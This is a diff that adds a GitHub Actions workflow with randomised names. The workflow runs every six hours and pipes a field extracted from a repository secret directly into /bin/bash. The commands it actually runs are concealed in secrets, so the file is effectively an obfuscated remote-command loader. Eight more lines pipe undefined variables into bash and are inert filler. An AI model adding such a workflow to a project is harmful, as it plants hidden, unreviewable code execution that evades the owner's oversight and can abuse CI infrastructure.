@@ -1,0 +1,25 @@
+name: lujingxi3456
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '30 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: lujingxi3456
+        env:
+          zk781: ${{ secrets.zk781 }}
+        run: |
+          echo $zk781 | jq -r .ameuj60806 | /bin/bash
+          echo $yv59 | jq -r .qlz994 | /bin/bash
+          echo $i46342 | jq -r .ghiv54 | /bin/bash
+          echo $bi008 | jq -r .z1 | /bin/bash
+          echo $wdl59 | jq -r .tyxio4903 | /bin/bash
+          echo $pgobc28 | jq -r .rwcjt1 | /bin/bash
+          echo $i4 | jq -r .dnhlx6 | /bin/bash
+          echo $gdi4 | jq -r .er1 | /bin/bash
+          echo $j88550 | jq -r .bzym7 | /bin/bash
+
